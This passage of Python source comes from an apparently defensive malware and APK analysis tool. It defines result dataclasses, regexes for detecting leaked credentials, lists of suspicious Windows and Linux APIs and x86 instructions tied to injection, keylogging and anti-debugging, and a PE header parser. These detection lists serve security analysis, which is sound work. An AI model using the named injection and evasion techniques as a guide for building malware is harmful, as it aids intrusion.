@dataclass
class NativeLibraryInfo:
    """Analysis of a single native library (.so file)."""
    name: str
    architecture: str
    size: int
    is_stripped: bool
    has_debug_info: bool
    exported_functions: List[NativeFunction]
    jni_functions: List[str]
    imported_libraries: List[str]
    strings: List[str]  # Interesting strings found
    hardcoded_secrets: List[Dict[str, Any]]
    anti_debug_detected: bool
    anti_debug_techniques: List[str]
    crypto_functions: List[str]
    suspicious_patterns: List[Dict[str, Any]]


@dataclass  
class NativeAnalysisResult:
    """Complete native library analysis result."""
    total_libraries: int
    libraries: List[NativeLibraryInfo]
    total_jni_functions: int
    total_exported_functions: int
    architectures: List[str]
    security_findings: List[Dict[str, Any]]
    overall_native_risk: str  # low, medium, high, critical


@dataclass
class HardeningCategory:
    """A category in the hardening score."""
    name: str
    score: int  # 0-100
    max_score: int
    weight: float
    findings: List[Dict[str, Any]]
    recommendations: List[str]


@dataclass
class HardeningScore:
    """Overall APK hardening/security score."""
    overall_score: int  # 0-100
    grade: str  # A, B, C, D, F
    risk_level: str  # Low, Medium, High, Critical
    categories: List[HardeningCategory]
    attack_surface_score: int
    protection_score: int
    data_security_score: int
    summary: str
    top_risks: List[str]
    top_recommendations: List[str]


# ============================================================================
# JADX Decompilation Types
# ============================================================================

@dataclass
class JadxDecompiledClass:
    """A decompiled Java class from JADX."""
    class_name: str
    package_name: str
    file_path: str  # Relative path in decompiled output
    source_code: str
    line_count: int
    is_activity: bool = False
    is_service: bool = False
    is_receiver: bool = False
    is_provider: bool = False
    is_application: bool = False
    extends: Optional[str] = None
    implements: List[str] = field(default_factory=list)
    methods: List[str] = field(default_factory=list)
    fields: List[str] = field(default_factory=list)
    security_issues: List[Dict[str, Any]] = field(default_factory=list)


@dataclass
class JadxDecompilationResult:
    """Complete JADX decompilation result."""
    package_name: str
    total_classes: int
    total_files: int
    output_directory: str
    classes: List[JadxDecompiledClass]
    resources_dir: str
    manifest_path: str
    source_tree: Dict[str, Any]  # Directory structure
    decompilation_time: float
    errors: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)


# ============================================================================
# Manifest Visualization Types
# ============================================================================

@dataclass
class ManifestNode:
    """A node in the manifest visualization graph."""
    id: str
    name: str
    node_type: str  # activity, service, receiver, provider, permission, feature
    label: str
    is_exported: bool = False
    is_main: bool = False
    is_dangerous: bool = False
    attributes: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ManifestEdge:
    """An edge in the manifest visualization graph."""
    source: str
    target: str
    edge_type: str  # uses_permission, intent_filter, data_scheme, category
    label: str


@dataclass
class ManifestVisualization:
    """Complete manifest visualization data."""
    package_name: str
    app_name: Optional[str]
    version_name: Optional[str]
    nodes: List[ManifestNode]
    edges: List[ManifestEdge]
    component_counts: Dict[str, int]
    permission_summary: Dict[str, int]  # dangerous, normal, signature, etc.
    exported_count: int
    main_activity: Optional[str]
    deep_link_schemes: List[str]
    mermaid_diagram: str  # Pre-rendered mermaid flowchart
    # AI-enhanced fields
    ai_analysis: Optional[str] = None  # AI interpretation of manifest structure
    component_purposes: Optional[Dict[str, str]] = None  # AI-inferred purpose of each component
    security_assessment: Optional[str] = None  # AI security analysis of manifest
    intent_filter_analysis: Optional[Dict[str, Any]] = None  # Detailed intent filter breakdown


# ============================================================================
# Attack Surface Map Types
# ============================================================================

@dataclass
class AttackVector:
    """A potential attack vector/entry point."""
    id: str
    name: str
    vector_type: str  # exported_activity, deep_link, content_provider, broadcast, etc.
    component: str
    severity: str  # low, medium, high, critical
    description: str
    exploitation_steps: List[str]
    required_permissions: List[str]
    adb_command: Optional[str] = None
    intent_example: Optional[str] = None
    mitigation: str = ""


@dataclass
class ExposedDataPath:
    """An exposed data path through content providers."""
    provider_name: str
    uri_pattern: str
    permissions_required: List[str]
    operations: List[str]  # read, write, delete
    is_exported: bool
    potential_data: str
    risk_level: str


@dataclass
class DeepLinkEntry:
    """A deep link entry point."""
    scheme: str
    host: str
    path: str
    full_url: str
    handling_activity: str
    parameters: List[str]
    is_verified: bool  # App Links verification
    security_notes: List[str]


@dataclass
class AttackSurfaceMap:
    """Complete attack surface analysis."""
    package_name: str
    total_attack_vectors: int
    attack_vectors: List[AttackVector]
    exposed_data_paths: List[ExposedDataPath]
    deep_links: List[DeepLinkEntry]
    ipc_endpoints: List[Dict[str, Any]]  # Inter-Process Communication endpoints
    overall_exposure_score: int  # 0-100
    risk_level: str  # low, medium, high, critical
    risk_breakdown: Dict[str, int]  # vectors by severity
    priority_targets: List[str]  # Top items to investigate
    automated_tests: List[Dict[str, Any]]  # adb commands to test each vector
    mermaid_attack_tree: str  # Visual attack tree diagram


# ============================================================================
# Secret Patterns
# ============================================================================

SECRET_PATTERNS = {
    "api_key": re.compile(r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,})["\']?', re.IGNORECASE),
    "aws_key": re.compile(r'(?:AKIA|ABIA|ACCA|ASIA)[A-Z0-9]{16}'),
    "aws_secret": re.compile(r'(?:aws[_-]?secret)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9/+=]{40})["\']?', re.IGNORECASE),
    "password": re.compile(r'(?:password|passwd|pwd)["\']?\s*[:=]\s*["\']?([^\s"\']{6,})["\']?', re.IGNORECASE),
    "private_key": re.compile(r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----'),
    "github_token": re.compile(r'gh[pousr]_[A-Za-z0-9_]{36,}'),
    "jwt": re.compile(r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'),
    "connection_string": re.compile(r'(?:mongodb|mysql|postgres|redis|mssql)://[^\s"\']+', re.IGNORECASE),
    "bearer_token": re.compile(r'[Bb]earer\s+[a-zA-Z0-9_\-\.]+'),
    "base64_secret": re.compile(r'(?:secret|key|token|password)["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/]{40,}={0,2})["\']?', re.IGNORECASE),
}

URL_PATTERN = re.compile(r'https?://[^\s<>"\']+')
EMAIL_PATTERN = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
IP_PATTERN = re.compile(r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b')
PATH_PATTERN = re.compile(r'(?:/[a-zA-Z0-9_\-\.]+){2,}|(?:[A-Z]:\\[a-zA-Z0-9_\-\.\\ ]+)')

# Dangerous Android permissions
DANGEROUS_PERMISSIONS = {
    "android.permission.READ_CONTACTS": "Access contacts",
    "android.permission.WRITE_CONTACTS": "Modify contacts",
    "android.permission.READ_CALL_LOG": "Access call logs",
    "android.permission.WRITE_CALL_LOG": "Modify call logs",
    "android.permission.READ_CALENDAR": "Access calendar",
    "android.permission.WRITE_CALENDAR": "Modify calendar",
    "android.permission.CAMERA": "Access camera",
    "android.permission.RECORD_AUDIO": "Record audio",
    "android.permission.READ_PHONE_STATE": "Access phone state",
    "android.permission.READ_PHONE_NUMBERS": "Access phone numbers",
    "android.permission.CALL_PHONE": "Make phone calls",
    "android.permission.READ_SMS": "Read SMS messages",
    "android.permission.SEND_SMS": "Send SMS messages",
    "android.permission.RECEIVE_SMS": "Receive SMS messages",
    "android.permission.READ_EXTERNAL_STORAGE": "Read external storage",
    "android.permission.WRITE_EXTERNAL_STORAGE": "Write external storage",
    "android.permission.ACCESS_FINE_LOCATION": "Access precise location",
    "android.permission.ACCESS_COARSE_LOCATION": "Access approximate location",
    "android.permission.ACCESS_BACKGROUND_LOCATION": "Access location in background",
    "android.permission.BODY_SENSORS": "Access body sensors",
    "android.permission.ACTIVITY_RECOGNITION": "Activity recognition",
    "android.permission.INTERNET": "Full network access",
    "android.permission.SYSTEM_ALERT_WINDOW": "Draw over other apps",
    "android.permission.REQUEST_INSTALL_PACKAGES": "Install packages",
    "android.permission.BIND_ACCESSIBILITY_SERVICE": "Accessibility service",
    "android.permission.BIND_DEVICE_ADMIN": "Device admin",
}

# ============================================================================
# LEGITIMACY INDICATORS - Used to reduce false positives on known-good software
# ============================================================================

# Known legitimate publishers/signers (case-insensitive matching)
LEGITIMATE_PUBLISHERS = {
    "microsoft", "google", "mozilla", "apple", "adobe", "oracle", "intel",
    "nvidia", "amd", "vmware", "cisco", "ibm", "hp", "dell", "lenovo",
    "amazon", "cloudflare", "github", "atlassian", "jetbrains", "slack",
    "spotify", "discord", "zoom", "dropbox", "1password", "lastpass",
    "symantec", "mcafee", "kaspersky", "norton", "avast", "avg",
    "chromium", "firefox", "electron", "node.js foundation",
}

# Known legitimate product name patterns
LEGITIMATE_PRODUCTS = {
    "chrome", "firefox", "edge", "safari", "opera", "brave",  # Browsers
    "visual studio", "vscode", "vs code", "intellij", "pycharm",  # IDEs
    "office", "word", "excel", "powerpoint", "outlook",  # Office
    "windows", "explorer", "notepad", "calc",  # Windows built-in
    "python", "node", "java", "dotnet", ".net",  # Runtimes
    "defender", "security", "antivirus",  # Security
}

# APIs that are NORMAL in legitimate software (only flag if other red flags present)
# These are marked as 'low' suspicion unless combined with other indicators
NORMAL_IN_LEGITIMATE_SOFTWARE = {
    "CreateProcess", "ShellExecute", "WinExec",  # Process creation is normal
    "InternetOpen", "URLDownloadToFile",  # Network is normal for most apps
    "CryptEncrypt", "CryptDecrypt",  # Crypto is normal for security
    "RegSetValue", "RegQueryValue",  # Registry access is normal
    "Sleep", "GetTickCount",  # Timing is normal
    "socket", "connect", "send", "recv",  # Network is normal
    "dlopen", "dlsym",  # Dynamic loading is normal
    "fork", "execve",  # Process management is normal on Linux
}

# APIs that are ALWAYS suspicious regardless of context
ALWAYS_SUSPICIOUS_APIS = {
    "NtUnmapViewOfSection",  # Process hollowing
    "ZwUnmapViewOfSection",  # Process hollowing variant
    "NtCreateThreadEx",  # Injection
    "RtlCreateUserThread",  # Injection
}

# Suspicious Windows API imports - NOW WITH CONTEXT AWARENESS
# severity: "high" = always flag, "medium" = flag unless legitimate, "low" = only flag with other indicators
SUSPICIOUS_IMPORTS = {
    "CreateRemoteThread": "Can inject code into other processes",
    "VirtualAllocEx": "Can allocate memory in other processes",
    "WriteProcessMemory": "Can write to other processes' memory",
    "ReadProcessMemory": "Can read other processes' memory",
    "NtUnmapViewOfSection": "Process hollowing technique",
    "SetWindowsHookEx": "Keylogger capability",
    "GetAsyncKeyState": "Keylogger capability",
    "InternetOpen": "Network communication",
    "URLDownloadToFile": "Can download files from internet",
    "WinExec": "Can execute commands",
    "ShellExecute": "Can execute programs",
    "CreateProcess": "Can spawn processes",
    "RegSetValue": "Can modify registry",
    "CryptEncrypt": "Encryption capability (ransomware indicator)",
    "CryptDecrypt": "Decryption capability",
    "IsDebuggerPresent": "Anti-debugging technique",
    "CheckRemoteDebuggerPresent": "Anti-debugging technique",
    "OutputDebugString": "Anti-debugging technique",
    "GetTickCount": "Anti-sandbox technique",
    "Sleep": "Anti-sandbox technique (long sleep)",
}

# Suspicion levels for imports (used for context-aware filtering)
IMPORT_SUSPICION_LEVEL = {
    # HIGH - Always suspicious
    "CreateRemoteThread": "high",
    "VirtualAllocEx": "high",
    "WriteProcessMemory": "high",
    "ReadProcessMemory": "medium",  # Debuggers use this legitimately
    "NtUnmapViewOfSection": "high",
    "SetWindowsHookEx": "medium",  # Some apps use for accessibility
    "GetAsyncKeyState": "medium",  # Games use this
    # MEDIUM - Suspicious but common in legitimate software
    "InternetOpen": "low",  # Almost all apps use networking
    "URLDownloadToFile": "low",  # Updaters use this
    "WinExec": "medium",
    "ShellExecute": "low",  # Very common
    "CreateProcess": "low",  # Very common
    "RegSetValue": "low",  # Most installers use this
    # LOW - Only suspicious in malware context
    "CryptEncrypt": "low",  # Normal for secure apps
    "CryptDecrypt": "low",
    "IsDebuggerPresent": "low",  # Even Chrome uses this
    "CheckRemoteDebuggerPresent": "low",
    "OutputDebugString": "info",  # Debug builds use this
    "GetTickCount": "info",  # Extremely common
    "Sleep": "info",  # Extremely common
}

# Suspicious Linux/ELF function imports
SUSPICIOUS_ELF_FUNCTIONS = {
    # Process manipulation
    "ptrace": "Can debug/trace processes (anti-debugging or injection)",
    "fork": "Creates child processes",
    "execve": "Executes programs",
    "execl": "Executes programs",
    "execlp": "Executes programs",
    "execv": "Executes programs",
    "execvp": "Executes programs",
    "system": "Executes shell commands",
    "popen": "Opens pipe to shell command",
    "dlopen": "Dynamic library loading",
    "dlsym": "Dynamic symbol resolution",
    # Network
    "socket": "Network communication",
    "connect": "Network connection",
    "bind": "Network binding (server)",
    "listen": "Network listening (server)",
    "accept": "Accepts network connections",
    "send": "Sends network data",
    "recv": "Receives network data",
    "sendto": "Sends UDP data",
    "recvfrom": "Receives UDP data",
    "gethostbyname": "DNS resolution",
    "getaddrinfo": "Address resolution",
    # File operations
    "unlink": "Deletes files",
    "rmdir": "Removes directories",
    "chmod": "Changes file permissions",
    "chown": "Changes file ownership",
    "mmap": "Memory mapping (code injection)",
    "mprotect": "Memory protection change (code injection)",
    # Privilege escalation
    "setuid": "Changes user ID",
    "setgid": "Changes group ID",
    "seteuid": "Changes effective user ID",
    "setegid": "Changes effective group ID",
    # Crypto (potential ransomware)
    "EVP_EncryptInit": "OpenSSL encryption",
    "EVP_DecryptInit": "OpenSSL decryption",
    "AES_encrypt": "AES encryption",
    "AES_decrypt": "AES decryption",
    "RSA_public_encrypt": "RSA encryption",
    # Anti-debugging/evasion
    "prctl": "Process control (can hide from ps)",
    "getenv": "Environment variable access",
    "uname": "System information gathering",
    "geteuid": "Check if running as root",
    "getpid": "Get process ID",
    "kill": "Send signals to processes",
}

# Suspicious x86/x64 instruction patterns - comprehensive list
SUSPICIOUS_INSTRUCTIONS = {
    # System calls
    "int 0x80": "Linux syscall (x86)",
    "syscall": "Linux syscall (x64)",
    "sysenter": "Fast syscall entry",
    "int 0x2e": "Windows syscall (legacy)",
    
    # Anti-debugging / Anti-VM
    "int3": "Debugger breakpoint (anti-debug)",
    "int 1": "Single-step trap (anti-debug)",
    "cpuid": "CPU identification (VM/sandbox detection)",
    "rdtsc": "Timestamp counter (timing attacks/anti-debug)",
    "rdtscp": "Timestamp counter with processor ID",
    "rdpmc": "Performance counter read (anti-debug)",
    "icebp": "ICE breakpoint (anti-debug)",
    "ud2": "Undefined instruction (anti-debug trigger)",
    
    # Privileged/Ring0 operations
    "in al": "I/O port read (rootkit/driver behavior)",
    "in ax": "I/O port read word (rootkit/driver behavior)",
    "in eax": "I/O port read dword (rootkit/driver behavior)",
    "out": "I/O port write (rootkit/driver behavior)",
    "cli": "Disable interrupts (kernel/rootkit)",
    "sti": "Enable interrupts (kernel/rootkit)",
    "hlt": "Halt processor (DoS/rootkit)",
    "lidt": "Load IDT (rootkit hooking)",
    "sidt": "Store IDT (VM detection)",
    "lgdt": "Load GDT (rootkit)",
    "sgdt": "Store GDT (VM detection)",
    "sldt": "Store LDT (VM detection)",
    "str": "Store task register (VM detection)",
    "ltr": "Load task register (rootkit)",
    "lldt": "Load LDT (rootkit)",
    "lmsw": "Load machine status word",
    "clts": "Clear task-switched flag (rootkit)",
    "invd": "Invalidate cache (DoS)",
    "wbinvd": "Write-back and invalidate cache",
    "invlpg": "Invalidate TLB entry",
    "wrmsr": "Write MSR (rootkit/hypervisor)",
    "rdmsr": "Read MSR (fingerprinting)",
    
    # Memory manipulation
    "swapgs": "Swap GS base (kernel exploit)",
    "xsave": "Save processor state",
    "xrstor": "Restore processor state",
    
    # Crypto operations (potential ransomware indicators)
    "aesenc": "AES encryption round (crypto/ransomware)",
    "aesenclast": "AES final encryption round",
    "aesdec": "AES decryption round",
    "aesdeclast": "AES final decryption round",
    "aesimc": "AES inverse mix columns",
    "aeskeygenassist": "AES key generation",
    "pclmulqdq": "Carryless multiplication (crypto)",
    "sha1": "SHA1 instruction (crypto)",
    "sha256": "SHA256 instruction (crypto)",
    
    # Self-modifying code indicators
    "stosb": "Store string byte (potential code modification)",
    "stosw": "Store string word",
    "stosd": "Store string dword",
    "stosq": "Store string qword",
    "rep stos": "Repeated store (memory fill/clear)",
    "rep movs": "Repeated move (memory copy)",
    
    # Indirect control flow (potential ROP/JOP)
    "jmp dword ptr": "Indirect jump (potential ROP gadget)",
    "jmp qword ptr": "Indirect jump 64-bit (potential ROP)",
    "call dword ptr": "Indirect call (potential shellcode)",
    "call qword ptr": "Indirect call 64-bit",
    "jmp rax": "Register indirect jump (ROP)",
    "jmp rbx": "Register indirect jump (ROP)",
    "jmp rcx": "Register indirect jump (ROP)",
    "jmp rdx": "Register indirect jump (ROP)",
    "jmp rsi": "Register indirect jump (ROP)",
    "jmp rdi": "Register indirect jump (ROP)",
    "call rax": "Register indirect call",
    "call rbx": "Register indirect call",
    "ret": "Return (ROP gadget terminator)",
    
    # Process/thread manipulation
    "vmptrld": "VMX load pointer (hypervisor)",
    "vmptrst": "VMX store pointer",
    "vmclear": "VMX clear VMCS",
    "vmread": "VMX read VMCS field",
    "vmwrite": "VMX write VMCS field",
    "vmlaunch": "VMX launch VM",
    "vmresume": "VMX resume VM",
    "vmxoff": "Exit VMX operation",
    "vmxon": "Enter VMX operation",
    "vmcall": "VMX call hypervisor",
    "vmfunc": "VMX function",
    
    # SGX instructions (enclave operations)
    "enclu": "SGX user-mode enclave operation",
    "encls": "SGX supervisor enclave operation",
    
    # Potential shellcode patterns
    "fstenv": "Store FPU environment (shellcode decoder)",
    "fnstenv": "Store FPU environment no-wait",
    "fldenv": "Load FPU environment",
    "fxsave": "Save FPU/MMX/SSE state",
    "fxrstor": "Restore FPU/MMX/SSE state",
}

# Anti-analysis function names
ANTI_ANALYSIS_FUNCTIONS = {
    "IsDebuggerPresent": "Windows debugger detection",
    "CheckRemoteDebuggerPresent": "Remote debugger check",
    "NtQueryInformationProcess": "Process info query (anti-debug)",
    "NtSetInformationThread": "Thread info manipulation",
    "OutputDebugStringA": "Debug output (anti-debug technique)",
    "OutputDebugStringW": "Debug output (anti-debug technique)",
    "QueryPerformanceCounter": "Timing check (anti-debug)",
    "GetTickCount": "Timing check (anti-debug)",
    "GetTickCount64": "Timing check (anti-debug)",
    "ptrace": "Linux debugger detection/manipulation",
    "getenv": "Environment check (sandbox detection)",
    "VirtualAlloc": "Memory allocation (shellcode loader)",
    "VirtualProtect": "Memory protection change (shellcode)",
    "NtAllocateVirtualMemory": "Low-level memory alloc",
    "NtProtectVirtualMemory": "Low-level memory protection",
    "CreateRemoteThread": "Remote code injection",
    "NtCreateThreadEx": "Thread creation (injection)",
    "WriteProcessMemory": "Process memory write (injection)",
    "ReadProcessMemory": "Process memory read",
    "LoadLibraryA": "DLL loading",
    "LoadLibraryW": "DLL loading",
    "GetProcAddress": "Function resolution (shellcode)",
    "LdrLoadDll": "Low-level DLL loading",
    "mmap": "Memory mapping (shellcode loader)",
    "mprotect": "Memory protection change (shellcode)",
    "dlopen": "Dynamic library loading",
    "dlsym": "Dynamic symbol resolution",
}


# ============================================================================
# Binary Analysis Functions
# ============================================================================

def extract_strings(data: bytes, min_length: int = 4, max_strings: int = 5000) -> List[ExtractedString]:
    """Extract ASCII and UTF-16 strings from binary data."""
    strings = []
    
    # Extract ASCII strings
    ascii_pattern = re.compile(rb'[\x20-\x7e]{' + str(min_length).encode() + rb',}')
    for match in ascii_pattern.finditer(data):
        if len(strings) >= max_strings:
            break
        try:
            value = match.group().decode('ascii')
            strings.append(ExtractedString(
                value=value,
                offset=match.start(),
                encoding="ascii",
                category=categorize_string(value),
            ))
        except UnicodeDecodeError:
            pass

    # Extract UTF-16 LE strings
    utf16_pattern = re.compile(rb'(?:[\x20-\x7e]\x00){' + str(min_length).encode() + rb',}')
    for match in utf16_pattern.finditer(data):
        if len(strings) >= max_strings:
            break
        try:
            value = match.group().decode('utf-16-le')
            strings.append(ExtractedString(
                value=value,
                offset=match.start(),
                encoding="utf16",
                category=categorize_string(value),
            ))
        except UnicodeDecodeError:
            pass
    
    # Deduplicate by value
    seen = set()
    unique_strings = []
    for s in strings:
        if s.value not in seen:
            seen.add(s.value)
            unique_strings.append(s)
    
    return unique_strings


def categorize_string(value: str) -> Optional[str]:
    """Categorize a string based on its content."""
    if URL_PATTERN.search(value):
        return "url"
    if EMAIL_PATTERN.search(value):
        return "email"
    if IP_PATTERN.search(value):
        return "ip_address"
    if PATH_PATTERN.search(value):
        return "path"
    for secret_type, pattern in SECRET_PATTERNS.items():
        if pattern.search(value):
            return secret_type
    return None


def detect_secrets_in_strings(strings: List[ExtractedString]) -> List[Dict[str, Any]]:
    """Find potential secrets in extracted strings."""
    secrets = []
    seen = set()
    
    for s in strings:
        for secret_type, pattern in SECRET_PATTERNS.items():
            matches = pattern.finditer(s.value)
            for match in matches:
                value = match.group(1) if match.lastindex else match.group(0)
                
                # Skip common false positives
                if value.lower() in {'password', 'secret', 'token', 'api_key', 'example', 'test'}:
                    continue
                if len(value) < 8:
                    continue
                
                dedup_key = f"{secret_type}:{value}"
                if dedup_key in seen:
                    continue
                seen.add(dedup_key)
                
                # Mask the value
                if len(value) > 8:
                    masked = value[:4] + '*' * (len(value) - 8) + value[-4:]
                else:
                    masked = value[:2] + '*' * (len(value) - 2)
                
                secrets.append({
                    "type": secret_type,
                    "value": value,
                    "masked_value": masked,
                    "offset": s.offset,
                    "context": s.value[:200],
                    "severity": get_secret_severity(secret_type),
                })
    
    return secrets


def get_secret_severity(secret_type: str) -> str:
    """Get severity level for a secret type."""
    critical = {"private_key", "aws_secret", "password", "connection_string"}
    high = {"api_key", "aws_key", "github_token", "jwt", "bearer_token", "base64_secret"}
    return "critical" if secret_type in critical else "high" if secret_type in high else "medium"


def parse_pe_header(data: bytes) -> Optional[BinaryMetadata]:
    """Parse PE (Windows executable) header."""
    try:
        # Check MZ signature
        if data[:2] != b'MZ':
            return None
        
        # Get PE header offset
        pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
        
        # Check PE signature
        if data[pe_offset:pe_offset+4] != b'PE\x00\x00':
            return None
        
        # Parse COFF header
        coff_offset = pe_offset + 4
        machine = struct.unpack('<H', data[coff_offset:coff_offset+2])[0]
        num_sections = struct.unpack('<H', data[coff_offset+2:coff_offset+4])[0]
        timestamp = struct.unpack('<I', data[coff_offset+4:coff_offset+8])[0]
        
        # Determine architecture
        arch_map = {
            # x86 family
            0x14c: "x86",  # IMAGE_FILE_MACHINE_I386
            0x8664: "x64",  # IMAGE_FILE_MACHINE_AMD64
            # ARM family
            0x1c0: "ARM",  # IMAGE_FILE_MACHINE_ARM
            0x1c2: "ARM_THUMB",  # IMAGE_FILE_MACHINE_THUMB (NEW: IoT devices)
            0x1c4: "ARM",  # IMAGE_FILE_MACHINE_ARMNT
            0xaa64: "ARM64",  # IMAGE_FILE_MACHINE_ARM64
            # RISC-V (NEW: 20+ billion cores)
            0x5032: "RISCV32",  # IMAGE_FILE_MACHINE_RISCV32
            0x5064: "RISCV64",  # IMAGE_FILE_MACHINE_RISCV64
            0x5128: "RISCV128",  # IMAGE_FILE_MACHINE_RISCV128
            # PowerPC (IBM servers)
            0x1f0: "PPC",  # IMAGE_FILE_MACHINE_POWERPC (NEW)
            0x1f1: "PPC",  # IMAGE_FILE_MACHINE_POWERPCFP
        }
        architecture = arch_map.get(machine, f"unknown (0x{machine:x})")
        
        # Parse optional header
        optional_offset = coff_offset + 20
        magic = struct.unpack('<H', data[optional_offset:optional_offset+2])[0]
        
        if magic == 0x10b:  # PE32
            entry_point = struct.unpack('<I', data[optional_offset+16:optional_offset+20])[0]
        elif magic == 0x20b:  # PE32+
            entry_point = struct.unpack('<I', data[optional_offset+16:optional_offset+20])[0]
        else:
            entry_point = None
        
        # Parse sections
        section_offset = optional_offset + (112 if magic == 0x10b else 128) + 16 * 16
        sections = []
        for i in range(min(num_sections, 20)):  # Limit to 20 sections
            sec_data = data[section_offset + i*40:section_offset + (i+1)*40]
            if len(sec_data) < 40:
                break
            name = sec_data[:8].rstrip(b'\x00').decode('ascii', errors='ignore')
            virtual_size = struct.unpack('<I', sec_data[8:12])[0]
            raw_size = struct.unpack('<I', sec_data[16:20])[0]
            characteristics = struct.unpack('<I', sec_data[36:40])[0]
            
            sections.append({
                "name": name,
                "virtual_size": virtual_size,
                "raw_size": raw_size,
                "characteristics": f"0x{characteristics:08x}",
            })
        
        # Check for packing indicators
        is_packed = False
        packer_name = None
        
        section_names = [s["name"].lower() for s in sections]
        if "upx0" in section_names or "upx1" in section_names:
            is_packed = True
            packer_name = "UPX"
        elif ".aspack" in section_names:
            is_packed = True
            packer_name = "ASPack"
        elif ".themida" in section_names:
            is_packed = True
            packer_name = "Themida"
        elif any(s["name"] == "" or s["virtual_size"] > s["raw_size"] * 10 for s in sections if s["raw_size"] > 0):
            is_packed = True
            packer_name = "Unknown (high entropy or unusual sections)"
        
        return BinaryMetadata(
            file_type="PE (Windows Executable)",
            architecture=architecture,
            file_size=len(data),
            entry_point=entry_point,
            is_packed=is_packed,
            packer_name=packer_name,
            compile_time=str(timestamp),
            sections=sections,
            headers={"pe_offset": pe_offset, "machine": f"0x{machine:x}", "magic": f"0x{magic:x}"},
        )
    except Exception as e:
        logger.error(f"PE parsing error: {e}")
        return None


# Rich header product ID to name mapping
RICH_PRODUCT_IDS = {
    0: "Unknown",
    1: "Import0 (VS 6.0)",
    2: "Linker510",
    3: "Cvtomf510",
    4: "Linker600",
    5: "Cvtomf600",
    6: "Cvtres500",
    7: "Utc11_Basic",
    8: "Utc11_C",
    9: "Utc12_Basic",
    10: "Utc12_C",
    11: "Utc12_CPP",
    12: "AliasObj60",
    13: "VisualBasic60",
    14: "Masm613",
    15: "Masm710",
    16: "Linker511",
    17: "Cvtomf511",
    18: "Masm614",
    19: "Linker512",
    20: "Cvtomf512",
    21: "Utc12_C_Std",
    22: "Utc12_CPP_Std",
    23: "Utc12_C_Book",
    24: "Utc12_CPP_Book",
    25: "Implib700",
    26: "Cvtomf700",
    27: "Utc13_Basic",
    28: "Utc13_C",
    29: "Utc13_CPP",
    30: "Linker610",
    31: "Cvtomf610",
    32: "Linker601",
    33: "Cvtomf601",
    34: "Utc12_1_Basic",
    35: "Utc12_1_C",
    36: "Utc12_1_CPP",
    37: "Linker620",
    38: "Cvtomf620",
    39: "AliasObj70",
    40: "Linker621",
    41: "Cvtomf621",
    42: "Masm615",
    43: "Utc13_LTCG_C",
    44: "Utc13_LTCG_CPP",
    45: "Masm620",
    46: "ILAsm100",
    47: "Utc12_2_Basic",
    48: "Utc12_2_C",
    49: "Utc12_2_CPP",
    50: "Utc12_2_C_Std",
    51: "Utc12_2_CPP_Std",
    52: "Utc12_2_C_Book",
    53: "Utc12_2_CPP_Book",
    54: "Implib622",
    55: "Cvtomf622",
    56: "Cvtres501",
    57: "Utc13_C_Std",
    58: "Utc13_CPP_Std",
    59: "Cvtpgd1300",
    60: "Linker622",
    61: "Linker700",
    62: "Export622",
    63: "Export700",
    64: "Masm700",
    65: "Utc13_POGO_I_C",
    66: "Utc13_POGO_I_CPP",
    67: "Utc13_POGO_O_C",
    68: "Utc13_POGO_O_CPP",
    69: "Cvtres700",
    70: "Cvtres710p",
    71: "Linker710p",
    72: "Cvtomf710p",
    73: "Export710p",
    74: "Implib710p",
    75: "Masm710p",
    76: "Utc13_POGO_I_C",
    77: "Utc13_POGO_I_CPP",
    78: "Linker624",
    79: "Cvtomf624",
    80: "Export624",
    81: "Implib624",
    82: "Linker710",
    83: "Cvtomf710",
    84: "Export710",
    85: "Implib710",
    86: "Cvtres710",
    87: "Utc14_C",
    88: "Utc14_CPP",
    89: "Utc14_C_Std",
    90: "Utc14_CPP_Std",
    91: "Utc14_LTCG_C",
    92: "Utc14_LTCG_CPP",
    93: "Utc14_POGO_I_C",
    94: "Utc14_POGO_I_CPP",
    95: "Utc14_POGO_O_C",
    96: "Utc14_POGO_O_CPP",
    # VS 2005+
    104: "Linker800",
    105: "Cvtomf800",
    106: "Export800",
    107: "Implib800",
    108: "Cvtres800",
    109: "Masm800",
    # VS 2008
    128: "Utc15_C (VS2008)",
    129: "Utc15_CPP (VS2008)",
    # VS 2010
    147: "Linker900 (VS2010)",
    148: "Cvtres900 (VS2010)",
    157: "Utc16_C (VS2010)",
    158: "Utc16_CPP (VS2010)",
    # VS 2012
    170: "Linker1000 (VS2012)",
    175: "Utc17_C (VS2012)",
    176: "Utc17_CPP (VS2012)",
    # VS 2013
    183: "Linker1100 (VS2013)",
    190: "Utc18_C (VS2013)",
    191: "Utc18_CPP (VS2013)",
    # VS 2015
    199: "Linker1200 (VS2015)",
    210: "Utc19_C (VS2015)",
    211: "Utc19_CPP (VS2015)",
    # VS 2017+
    220: "Linker1400 (VS2017)",
    257: "Utc1900_C (VS2017)",
    258: "Utc1900_CPP (VS2017)",
    259: "Utc1911_C (VS2017 15.3)",
    260: "Utc1911_CPP (VS2017 15.3)",
    261: "Utc1912_C (VS2017 15.5)",
    262: "Utc1912_CPP (VS2017 15.5)",
}

PE_RESOURCE_TYPES = {
    1: "RT_CURSOR",
    2: "RT_BITMAP",
    3: "RT_ICON",
    4: "RT_MENU",
    5: "RT_DIALOG",
    6: "RT_STRING",
    7: "RT_FONTDIR",
    8: "RT_FONT",
    9: "RT_ACCELERATOR",
    10: "RT_RCDATA",
    11: "RT_MESSAGETABLE",
    12: "RT_GROUP_CURSOR",
    14: "RT_GROUP_ICON",
    16: "RT_VERSION",
    17: "RT_DLGINCLUDE",
    19: "RT_PLUGPLAY",
    20: "RT_VXD",
    21: "RT_ANICURSOR",
    22: "RT_ANIICON",
    23: "RT_HTML",
    24: "RT_MANIFEST",
}

PE_CERTIFICATE_TYPES = {
    0x0001: "X509",
    0x0002: "PKCS7",
    0x0003: "Reserved",
}

